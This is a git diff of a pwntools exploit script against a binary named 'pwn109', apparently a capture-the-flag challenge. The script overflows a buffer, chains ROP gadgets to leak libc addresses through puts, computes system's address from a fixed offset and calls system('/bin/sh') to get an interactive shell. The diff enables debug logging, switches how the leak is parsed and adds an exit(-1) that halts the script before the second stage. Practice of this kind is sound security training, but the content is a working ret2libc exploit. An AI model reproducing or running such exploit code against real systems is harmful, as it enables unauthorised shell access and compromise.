@@ -1,7 +1,7 @@
 
 from pwn import *
 
-#context.log_level = "debug"
+context.log_level = "debug"
 context.binary = binary = ELF("./pwn109", checksec = False)
 
 pad = b'A'*40
@@ -34,15 +34,15 @@ io.recv()
 
 io.sendline(pad+ret_gadget+puts_address+setvbuf_address+gets_address+main_address)
 
-#io.recv()
-resp = io.recvall()
+io.recv()
+resp = io.recv()
 print('Response : ', resp)
 
-#resp = resp.split(b'\n')
-#resp = list(map(lambda yy: hex(u64(yy.ljust(8, b'\x00'))), resp[:-1]))
+resp = resp.split(b'\n')
+resp = list(map(lambda yy: hex(u64(yy.ljust(8, b'\x00'))), resp[:-1]))
 
 
-
+exit(-1)
 
 system_adr = p64(int(resp[0], 16) - 0x31550)
 print("Leaked Puts Address : ", resp[0])
@@ -53,6 +53,5 @@ print("Leaked BINSh Address : ", hex(u64(bin_sh)))
 print("Leaked System Address : ", hex(u64(system_adr)))
 
 io.sendline(pad+ret_gadget+pop_rdi_gadget+bin_sh+system)
-
 
 io.interactive()
